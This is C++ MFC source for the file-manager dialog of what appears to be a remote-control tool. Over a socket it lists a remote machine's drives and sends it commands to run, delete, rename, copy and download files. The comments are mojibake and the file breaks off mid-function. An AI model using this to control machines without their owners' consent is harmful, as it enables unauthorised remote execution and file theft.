// FileView.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "FileView.h"
#include "Common.h"
#include "FileManager.h"
#include "FolderDlg.h"
#include "FileRenDlg.h"
#include "AttriDlg.h"

// CFileView �Ի���

IMPLEMENT_DYNAMIC(CFileView, CDialog)

CFileView::CFileView(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CFileView::IDD, pParent)
{
	m_socket = sock;
	m_pWndMsg = pParent;
	m_bCopy = false;
}

CFileView::~CFileView()
{
}

void CFileView::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE_FILE, m_treeFile);
	DDX_Control(pDX, IDC_LIST_FILE, m_listCtrl);
}


BEGIN_MESSAGE_MAP(CFileView, CDialog)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE_FILE, &CFileView::OnTvnSelchangedTreeFile)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_FILE, &CFileView::OnNMRClickListFile)
	ON_COMMAND(ID_FILE_DOWNLOAD, &CFileView::OnFileDownload)
	ON_COMMAND(ID_FILE_UPLOAD, &CFileView::OnFileUpload)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_FILE, &CFileView::OnNMDblclkListFile)
	ON_COMMAND(ID_FILE_RUN, &CFileView::OnFileRun)
	ON_COMMAND(ID_FILE_FLUSH, &CFileView::OnFileRefresh)
	ON_COMMAND(ID_FILE_CREATE, &CFileView::OnFolderCreate)
	ON_COMMAND(ID_FILE_DEL, &CFileView::OnFileDel)
	ON_COMMAND(ID_FILE_COPY, &CFileView::OnFileCopy)
	ON_COMMAND(ID_FILE_PASTE, &CFileView::OnFilePaste)
	ON_COMMAND(ID_FILE_RENAME, &CFileView::OnFileRename)
	ON_COMMAND(ID_FILE_ATTRIBUTE, &CFileView::OnFileAttribute)
END_MESSAGE_MAP()


// CFileView ��Ϣ�������
BOOL CFileView::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CFileView::OnInitDialog()
{
	CDialog::OnInitDialog();
	bool bSuccess = true;
	InitDlg();
	GetClientRect(&m_rect);  //�õ��ͻ�����С
	MSGINFO msgInfo;
	memset(&msgInfo, 0, sizeof(MSGINFO));
	msgInfo.nMsgCmd = CMD_DISKINFO;   //��ȡ������Ϣ
	UINT32 result = m_moduleSocket.SendCommand(m_socket, (char*)&msgInfo, sizeof(MSGINFO), &bSuccess);  //���ͻ�ȡ������Ϣ����
	if (ERROR_SUCCESS != result && !bSuccess)
	{
		AfxMessageBox(_T("���ͻ�ȡ������Ϣ����ʧ��!"));
	}
	return TRUE;
}

void CFileView::InitDlg()
{
	m_ImageTree.Create(16, 16, ILC_COLOR24 | ILC_MASK, 1, 1);  //����ͼ���б�
	m_ImageList.Create(32, 32, ILC_COLOR24 | ILC_MASK, 20, 40);

	HICON hIcon[4];
	hIcon[0] = AfxGetApp()->LoadIcon(IDI_ICON_COMPUTER);    //�ҵĵ���
	hIcon[1] = AfxGetApp()->LoadIcon(IDI_ICON_DISK);        //����
	hIcon[2] = AfxGetApp()->LoadIcon(IDI_ICON_REMOVE);      //�ƶ�����
	hIcon[3] = AfxGetApp()->LoadIcon(IDI_ICON_FOLDER);      //�ļ���
	for (int index = 0; index < 4; index++)
	{
		m_ImageTree.Add(hIcon[index]);
	}
	m_treeFile.SetImageList(&m_ImageTree, TVSIL_NORMAL);
	m_Root_tree = m_treeFile.InsertItem(_T("Զ�̵���"), 0, 0, TVI_ROOT);
	
	m_listCtrl.SetImageList(&m_ImageList, LVSIL_SMALL);  //Сͼ��(reportģʽ)
	m_listCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	m_listCtrl.InsertColumn(0, _T("�ļ�����"), LVCFMT_CENTER, 223);	
	m_listCtrl.InsertColumn(1, _T("�ļ�����"), LVCFMT_CENTER,  68);
	m_listCtrl.InsertColumn(2, _T("�ļ���С"), LVCFMT_CENTER, 100);
    
    //�Ҽ��˵�ͼ��
	m_MenuBmp[0].LoadBitmap(IDB_BMP_RUN);
	m_MenuBmp[1].LoadBitmap(IDB_BMP_REFRESH);
	m_MenuBmp[2].LoadBitmap(IDB_BMP_COPY);
	m_MenuBmp[3].LoadBitmap(IDB_BMP_PASTE);
	m_MenuBmp[4].LoadBitmap(IDB_BMP_DEL);
	m_MenuBmp[5].LoadBitmap(IDB_BMP_UPLOAD);
	m_MenuBmp[6].LoadBitmap(IDB_BMP_DOWNLOAD);
	m_MenuBmp[7].LoadBitmap(IDB_BMP_CREATE);

	m_nDirCount = 0;  //�ļ�����Ŀ
}

void CFileView::SetDiskInfo( DRIVER_C tagDisk )
{
	DRIVER_C* pDriver_c = new DRIVER_C;  //����new��ԭ����Ҫ���setItemData����
    CString strDiskName = _T("");
	int index = 0;
	switch (tagDisk.nType)
	{
	case DISK_FIXED:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 1;
		}
		break;
	case DISK_REMOVABLE:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 1;
		}
		break;
	case DISK_CDROM:
		{
			strDiskName.Format(_T("%c:"), tagDisk.disk);
			index = 2;
		}
		break;
	default:
		return;
	}
	HTREEITEM hItem = m_treeFile.InsertItem(strDiskName, index, index, m_Root_tree, 0);
	m_treeFile.Expand(m_Root_tree, TVE_EXPAND);
	memcpy(pDriver_c, &tagDisk, sizeof(tagDisk));
	m_treeFile.SetItemData(hItem, (DWORD)pDriver_c);  //���ڵ���Ϣ����Item��
}

void CFileView::SetFileListInfo( IN FILEINFO_C tagFileInfo )
{
	int i = 0;
	switch (tagFileInfo.nType)
	{
	case FILE_ATTR:    //�ļ�
		{
			int nCount = m_listCtrl.GetItemCount();  //�Ѿ���ȡ��������
			SHFILEINFO shInfo; //mfc�ļ���Ϣ�ṹ��
			memset((char*)&shInfo, 0, sizeof(shInfo));
		
			//�����ļ���չ��������ͼ����ʾ�����紫��������a.exe�����ҵ��ͻ���exe�ļ�ͼ����ʾ�ľ��.
            if (SHGetFileInfo(tagFileInfo.szFileName, 0, &shInfo, sizeof(shInfo), SHGFI_ICON |SHGFI_USEFILEATTRIBUTES))
			{
				i = m_ImageList.Add(shInfo.hIcon);   //���ļ�ͼ������ӵ�CImageList�ؼ���Ա������
				m_listCtrl.InsertItem(nCount, tagFileInfo.szFileName, i);
			}
			else   //�ļ�ͼ������ȡʧ��! �������Դ������ļ�ͼ��
			{
				i = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_FILE));
				m_listCtrl.InsertItem(nCount, tagFileInfo.szFileName, i);
			}
			m_listCtrl.SetItemText(nCount, 1, _T(""));
			__int64* pFileSize = new __int64(tagFileInfo.size);
			m_listCtrl.SetItemData(nCount, DWORD(pFileSize));
			CString strFileSize = _T("");  //�ļ���С
			strFileSize = GetRealSize(tagFileInfo.size);
			m_listCtrl.SetItemText(nCount, 2, strFileSize);
		}
		break;
	case FOLDER_ATTR:  //�ļ���
		{
			m_treeFile.InsertItem(tagFileInfo.szFileName, 3, 3, m_hItem, 0);  //������ؼ�
			i = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_FOLDERLIST));  //�ļ���ͼ��
			m_listCtrl.InsertItem(m_nDirCount, tagFileInfo.szFileName, i);
			m_listCtrl.SetItemText(m_nDirCount, 1, _T("�ļ���"));
			m_listCtrl.SetItemText(m_nDirCount, 2, _T("0"));
			m_nDirCount++;  //�ļ�������
		}
		break;
	case FILE_TAG:    //�ļ��б���Ϣ�������
		{
	//		m_bFlag = true;
			m_treeFile.Expand(m_hItem, TVE_EXPAND);  //չ������Ľڵ�
		}
		break;
	default:
		break;
	}
	UpDataStatusBar(m_hItem);
}

void CFileView::SetFileExecInfo(IN FILEEXECINFO_C tagFileInfo)
{
	CString strExecFile = _T(""); 
	if (tagFileInfo.bSuccess)  //ִ�гɹ�
	{
		strExecFile = _T("��ϲ,�ļ�ִ�гɹ�!");
	}
	else
	{
		strExecFile = _T("O shit,�ļ�ִ��ʧ��!");
	}
	TCHAR* pText = strExecFile.GetBuffer(strExecFile.GetLength());
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)pText);
}

void CFileView::OnTvnSelchangedTreeFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	TVITEM item = pNMTreeView->itemNew;  //�õ��������Ϣ
	m_listCtrl.DeleteAllItems();
	m_hItem = item.hItem;
	if (m_Root_tree == m_hItem)  //����Ǹ��ڵ㣬�����
	{
		return ;
	}
	DelChildItem(m_hItem);
	GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //�����ı��ؼ�·����ֵ
	MSGINFO tagMsg;
	tagMsg.nMsgCmd = CMD_FILELIST;
	wchar_t szPath[MAX_PATH] = {0};
	wcscpy_s(szPath, GetCurFilePath(m_hItem));
	memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //���͵�ǰ����·����Ϣ
	m_nDirCount = 0;

	*pResult = 0;
}

void CFileView::UpDataStatusBar(HTREEITEM hItem)
{
	CString strLeftStatusBar = _T("");  //���״̬����Ϣ
	CString strRightStatusBar = _T("");  //�ұ�״̬��
	if (m_Root_tree == hItem)
	{
		strLeftStatusBar = _T("����");
	}
	else if (m_Root_tree == m_treeFile.GetParentItem(hItem))
	{
		DRIVER_C* pDriver_C = (DRIVER_C*)m_treeFile.GetItemData(hItem);
		switch (pDriver_C->nType)
		{
		case DISK_FIXED:
			{
				strLeftStatusBar.Format(_T("���ش��� (%c)\n�ܴ�С: %0.2f GB"), pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		case DISK_REMOVABLE:
			{
				strLeftStatusBar.Format(_T("���ƶ����� (%c)\n�ܴ�С: %0.2f GB"), pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		case DISK_CDROM:
			{
				strLeftStatusBar.Format(_T("CD-ROM���� (%c)\n�ܴ�С: %0.2f GB"),pDriver_C->disk, pDriver_C->dwTotal);
				break;
			}
		default:
			break;
		}
		strRightStatusBar.Format(_T("���ÿռ�: %0.2f GB"), pDriver_C->dwFree);
	}
	else
	{
		int nFileCount = m_listCtrl.GetItemCount();
		strLeftStatusBar.Format(_T("%d ������"), nFileCount);
		strRightStatusBar.Format(_T(""));
	}
	TCHAR* pTextLeft = strLeftStatusBar.GetBuffer(strLeftStatusBar.GetLength());
	TCHAR* pTextRight = strRightStatusBar.GetBuffer(strRightStatusBar.GetLength());
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pTextLeft);
	::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)1, (LPARAM)pTextRight);
}

void CFileView::OnNMRClickListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CString strCurPath;
	GetDlgItem(IDC_EDIT_CURPATH)->GetWindowText(strCurPath);
	if (strCurPath.IsEmpty())
	{
		return;
	}
	CMenu fileMenu;
	fileMenu.LoadMenu(IDR_MENU_FILE);
	CMenu *pSubMenu = fileMenu.GetSubMenu(0);
    
	pSubMenu->SetMenuItemBitmaps(ID_FILE_RUN, MF_BYCOMMAND, &m_MenuBmp[0], &m_MenuBmp[0]);  //����
	pSubMenu->SetMenuItemBitmaps(ID_FILE_FLUSH, MF_BYCOMMAND, &m_MenuBmp[1], &m_MenuBmp[1]); //ˢ��
	pSubMenu->SetMenuItemBitmaps(ID_FILE_COPY, MF_BYCOMMAND, &m_MenuBmp[2], &m_MenuBmp[2]);   //copy
	pSubMenu->SetMenuItemBitmaps(ID_FILE_PASTE, MF_BYCOMMAND, &m_MenuBmp[3], &m_MenuBmp[3]);   //paste
	pSubMenu->SetMenuItemBitmaps(ID_FILE_DEL, MF_BYCOMMAND, &m_MenuBmp[4], &m_MenuBmp[4]);   //ɾ��
	pSubMenu->SetMenuItemBitmaps(ID_FILE_UPLOAD, MF_BYCOMMAND, &m_MenuBmp[5], &m_MenuBmp[5]);   //�ϴ�
	pSubMenu->SetMenuItemBitmaps(ID_FILE_DOWNLOAD, MF_BYCOMMAND, &m_MenuBmp[6], &m_MenuBmp[6]);  //����
	pSubMenu->SetMenuItemBitmaps(ID_FILE_CREATE, MF_BYCOMMAND, &m_MenuBmp[7], &m_MenuBmp[7]);  //�½�
    int nItem = pNMItemActivate->iItem;  //ѡ���������ֵ
    if (-1 == nItem) //û��ѡ����
	{
		pSubMenu->EnableMenuItem(ID_FILE_RUN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_DEL, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_RENAME, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_ATTRIBUTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		if (!m_bCopy)  //�ܲ��ܿ���
		{
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);   //ճ��
		}
	}
	else
	{
		CString strType = m_listCtrl.GetItemText(nItem, 1);
		if (_T("�ļ���") == strType) //ѡ�е����ļ���
		{
			pSubMenu->EnableMenuItem(ID_FILE_RUN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);   //����
			pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //����
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //ճ��
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //�ϴ�
			pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED); //����
			pSubMenu->EnableMenuItem(ID_FILE_CREATE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //�½��ļ���
			pSubMenu->EnableMenuItem(ID_FILE_ATTRIBUTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else //ѡ�����ļ�
		{
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //ճ��
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //�ϴ�
			pSubMenu->EnableMenuItem(ID_FILE_CREATE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //�½��ļ���
		}
	}
	CPoint point;
	GetCursorPos(&point);  //��ȡ���λ��
	pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, point.x, point.y, this);
	*pResult = 0;
}

//���˫��List�ؼ��ļ���
void CFileView::OnNMDblclkListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
    if (1 == m_listCtrl.GetSelectedCount())  //˫��ѡ����һ��
	{
		POSITION pos;
		pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL != pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			if (0 == m_listCtrl.GetItemText(nItem, 1).Compare(_T("�ļ���")))   //˫��ѡ�е����ļ���
			{
				CString strCurFolderPath = _T("");  //���ļ��е�·��
				CString strCurFolderName = _T("");  //�ļ��е�����
				GetDlgItemText(IDC_EDIT_CURPATH, strCurFolderPath);
				if (_T("\\") != strCurFolderPath.Right(1))
				{
					strCurFolderPath += _T("\\");
				}
				strCurFolderName =  m_listCtrl.GetItemText(nItem, 0);  //�����ļ���
				strCurFolderPath += strCurFolderName;
				m_hItem = GetCurhItemByPath(strCurFolderName);  //�����ļ����õ���ǰ���ؼ��ľ��ֵ
				m_listCtrl.DeleteAllItems();  //ɾ������ǰList�ؼ�������
				DelChildItem(m_hItem);
				GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //�����ı��ؼ�·����ֵ
				MSGINFO tagMsg;
				tagMsg.nMsgCmd = CMD_FILELIST;
				wchar_t szPath[MAX_PATH] = {0};
				wcscpy_s(szPath, GetCurFilePath(m_hItem));
				memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
				bool bSuccess = true;
				m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //���͵�ǰ����·����Ϣ
				m_nDirCount = 0;
			}
		}
	}

	*pResult = 0;
}

//-------------------------------------------------------------
//�ļ���ִ��
void CFileView::OnFileRun()
{
	// TODO: �ڴ���������������
	MSGINFO tagMsg;
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL == pos)
	{
		return;
	}
	else
	{
		while (pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			CString strType = _T("");   //��ִ���ļ�������
			strType = m_listCtrl.GetItemText(nItem, 1);
			if (_T("�ļ���") == strType)  //���ѡ�����ļ���
			{
				continue;
			}
			//��ȡԶ��ִ���ļ���·��
			CString strFilePath = _T("");
			GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
			const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //�õ��ļ�������
			strFilePath += strFileName;
			memset(&tagMsg, 0, sizeof(MSGINFO));
			tagMsg.nMsgCmd = CMD_FILEEXEC;
			wchar_t szPath[MAX_PATH] = {0};
			wcscpy_s(szPath, strFilePath);
			memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
			bool bSuccess = true;
			m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //����ִ���ļ�����
		}
	}
}

//ˢ�²���
void CFileView::OnFileRefresh()
{
	m_listCtrl.DeleteAllItems();
	if (m_Root_tree == m_hItem)  //����Ǹ��ڵ㣬�����
	{
		return ;
	}
	DelChildItem(m_hItem);
	GetDlgItem(IDC_EDIT_CURPATH)->SetWindowText(GetCurFilePath(m_hItem));  //�����ı��ؼ�·����ֵ
	MSGINFO tagMsg;
	tagMsg.nMsgCmd = CMD_REFRESH;
 	wchar_t szPath[MAX_PATH] = {0};
	wcscpy_s(szPath, GetCurFilePath(m_hItem));
	memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);  //���͵�ǰ����·����Ϣ
	m_nDirCount = 0;
}

//ɾ���ļ����ļ���
void CFileView::OnFileDel()
{
	FILEINFO_C tagFileInfo;  //�ļ���Ϣ
	if (IDYES == ::MessageBox(this->m_hWnd, _T("��ȷ��Ҫɾ���ļ���?"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING))
	{
		CString strDelPath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strDelPath);  //��ȡ��ǰɾ����·��
	
		POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL == pos)
		{
			return;
		}
		else
		{
			while (pos)
			{
				int nItem = m_listCtrl.GetNextSelectedItem(pos);
				memset(&tagFileInfo, 0, sizeof(FILEINFO_C));
				CString strType = _T("");   //ɾ���ļ�������
				strType = m_listCtrl.GetItemText(nItem, 1);
				
				CString strDelName = _T("");
				strDelName = m_listCtrl.GetItemText(nItem, 0);   //ɾ���ļ�������
				if (_T("�ļ���") == strType)  //ɾ�������ļ���
				{
					tagFileInfo.nType = FOLDER_ATTR;
				}
				else   //ɾ�������ļ�
				{
					tagFileInfo.nType = FILE_ATTR;
				}
				strDelName = strDelPath + strDelName;   //����ɾ�����ļ�·��������
				wsprintfW(tagFileInfo.szFileName, _T("%s"), strDelName);  //CString ת�� TCHAR szbuf[MAX_PATH]
             
				MSGINFO tagMsgInfo;
				memset(&tagMsgInfo, 0, sizeof(MSGINFO));
				tagMsgInfo.nMsgCmd = CMD_FILE_DEL;
				memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILEINFO_C));
				bool bSuccess = true;
				m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
			    //�����������������ʾ�ļ��б���Ϣ��Ӧ�÷�װ��һ������
				m_listCtrl.DeleteAllItems();
				DelChildItem(m_hItem);
				m_nDirCount = 0;
			}
		}
	}
}

//�½��ļ���(����Ŀ¼)
void CFileView::OnFolderCreate()
{
	CFolderDlg cFolderDir(this);
	cFolderDir.DoModal();
	if (cFolderDir.m_bOk)
	{
		CString strFilePath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		CString strFolder = cFolderDir.GetFolderName();  //Ŀ¼��
		strFilePath += strFolder;   //C:\\windows\1
		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_FOLDER_CREATE;    //����Ŀ¼
	    wchar_t szPath[MAX_PATH] = {0};
		wcscpy_s(szPath, strFilePath);
		memcpy((char*)tagMsg.context, (char*)szPath, sizeof(szPath));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
		m_listCtrl.DeleteAllItems();
		DelChildItem(m_hItem);
		m_nDirCount = 0;
 	}
}

//�ļ�����
void CFileView::OnFileCopy()
{
	int nCount = m_listCtrl.GetSelectedCount();
	bool bSuccess = true;
	if (0 == nCount)
	{
		m_bCopy = false;
	}
	else
	{
		m_bCopy = true;   //����ճ��
	}

	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL == pos)
	{
		return;
	}
	else
	{
		FILECOPY_C tagFileInfo;
		MSGINFO tagMsgInfo;
	
		memset(&tagFileInfo, 0, sizeof(FILECOPY_C));
		tagFileInfo.bTag = true;
		memset(&tagMsgInfo, 0, sizeof(MSGINFO));
		tagMsgInfo.nMsgCmd = CMD_FILE_COPY;
		memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //��ʼ���͸�����Ϣ

		while (pos)
		{
			int nItem = m_listCtrl.GetNextSelectedItem(pos);
			CString strType = _T("");   //�����ļ�������
			strType = m_listCtrl.GetItemText(nItem, 1);
			if (_T("�ļ���") == strType)  //������ص����ļ���
			{
				continue;
			}
			//��ȡԶ���ļ���·��
			CString strFilePath = _T("");
			GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
			const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //�õ��ļ�������
			strFilePath += strFileName;

			memset(&tagMsgInfo, 0, sizeof(MSGINFO));
			tagMsgInfo.nMsgCmd = CMD_FILE_COPY;
			memset(&tagFileInfo, 0, sizeof(FILECOPY_C));
			tagFileInfo.bTag = false; 

			wcscpy_s(tagFileInfo.szFilePath, strFilePath);
			wcscpy_s(tagFileInfo.szFileName, strFileName);
			memcpy((char*)tagMsgInfo.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
			m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
		}
	}
}

//�ļ�ճ��(��Ҫ�Ĺ������ݾ��ǽ���ǰ������ŵ�·�����͸��⼦)
void CFileView::OnFilePaste()
{
	CString strFilePath = _T("");
	GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
	wchar_t szFilePath[MAX_PATH] = {0};
	wcscpy_s(szFilePath, strFilePath);
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_FILE_PASTE;
	memcpy((char*)tagMsgInfo.context, (char*)szFilePath, sizeof(szFilePath));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	m_listCtrl.DeleteAllItems();
	DelChildItem(m_hItem);
	m_nDirCount = 0;
	m_bCopy = false;
}

//�ļ�������
void CFileView::OnFileRename()
{
	// TODO: �ڴ���������������
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL != pos)
	{
		int nItem = m_listCtrl.GetNextSelectedItem(pos);
		CFileRenDlg cFileRenDir(this, m_listCtrl.GetItemText(nItem, 0));
		cFileRenDir.DoModal();
		if (!cFileRenDir.m_bOk)
		{
			return;
		}
		FILECOPY_C tagFileInfo;
		memset(&tagFileInfo, 0, sizeof(FILECOPY_C));

		CString strType = m_listCtrl.GetItemText(nItem, 1);   //���ļ�(��)��
		if (0 == strType.Compare(_T("�ļ���")))  //�����������ļ���
		{
			tagFileInfo.bTag = false;   //false��ʾ�����ļ���
		}
		else
		{
			tagFileInfo.bTag = true;   //true��ʾ�����ļ�
		}

		CString strFilePath = _T("");
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		strFilePath += m_listCtrl.GetItemText(nItem, 0);   //C:\\windows\1

		wsprintfW(tagFileInfo.szFileName, cFileRenDir.GetFileName());   //���ļ�(��)ȫ·��
		wsprintfW(tagFileInfo.szFilePath, strFilePath);  //������������

		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_FILE_RENAME;    //������
		memcpy((char*)tagMsg.context, (char*)&tagFileInfo, sizeof(FILECOPY_C));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
		m_listCtrl.DeleteAllItems();
		DelChildItem(m_hItem);
		m_nDirCount = 0;
	}
}

//�鿴�ļ����ļ�������
void CFileView::OnFileAttribute()
{
	POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
	if (NULL != pos)
	{
		int nItem = m_listCtrl.GetNextSelectedItem(pos);
		ATTRIBUTE_C tagAttribute;
		memset(&tagAttribute, 0, sizeof(ATTRIBUTE_C));
		CString strType = m_listCtrl.GetItemText(nItem, 0);  //����
		if (0 == strType.Compare(_T("�ļ���")))
		{
			tagAttribute.nType = FOLDER_ATTR;
		}
		else
		{
			tagAttribute.nType = FILE_ATTR;
		}

		CString strFilePath = _T("");   //�ļ�·��
		GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
		CString strFileName = _T("");  //�ļ���
		strFileName = m_listCtrl.GetItemText(nItem, 0);
		wsprintfW(tagAttribute.szFilePath, strFilePath);   //�ļ�·��
		wsprintfW(tagAttribute.szFileName, strFileName);   //�ļ���
		
		MSGINFO tagMsg;
		memset(&tagMsg, 0, sizeof(MSGINFO));
		tagMsg.nMsgCmd = CMD_ATTRIBUTE;    //�鿴����
		memcpy((char*)tagMsg.context, (char*)&tagAttribute, sizeof(ATTRIBUTE_C));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsg, sizeof(MSGINFO), &bSuccess);
	}
}

//��������
void CFileView::SetArrtibuteInfo(IN ATTRIBUTE_C tagAttribute)
{
	CAttriDlg cAttributeDlg(this, &tagAttribute);
	cAttributeDlg.DoModal();   //��ʾ���ԶԻ���
}

//������������
void CFileView::OnFileDownload()
{
	// TODO: �ڴ���������������
	CFileDir cFileDir(this);
	int iCount = 0;
	cFileDir.DoModal();
	if (cFileDir.m_bOk)
	{
		POSITION pos = m_listCtrl.GetFirstSelectedItemPosition();
		if (NULL == pos)
		{
			return;
		}
		else
		{
			while (pos)
			{
				int nItem = m_listCtrl.GetNextSelectedItem(pos);
				CString strType = _T("");   //�����ļ�������
				strType = m_listCtrl.GetItemText(nItem, 1);
				if (_T("�ļ���") == strType)  //������ص����ļ���
				{
					continue;
				}
				//��ȡԶ���ļ���·��
				CString strFilePath = _T("");
				GetDlgItemText(IDC_EDIT_CURPATH, strFilePath);
				const CString strFileName = m_listCtrl.GetItemText(nItem, 0);  //�õ��ļ�������
				strFilePath += strFileName;
				//��ȡĿ���ļ�����·��
				CString strDesFilePath = _T("");
				strDesFilePath = cFileDir.GetLocationPath();
				if (_T("\\") != strDesFilePath.Right(1))
				{
					strDesFilePath += _T("\\");
				}
				strDesFilePath += strFileName;
				//��ȡ�ļ���С
				CString strFileSize = _T("");  //�ļ��Ĵ�С
				strFileSize = m_listCtrl.GetItemText(nItem, 2);
				//��ȡ�ļ���ʵ�ʴ�С
				__int64 *puSize = (__int64*)(m_listCtrl.GetItemData(nItem));
				((CFileManager*)m_pWndMsg)->GetFileTransPoint()->OnAddFileList(0, strFilePath, strDesFilePath, strFileSize, puSize);
                iCount++;		
			}
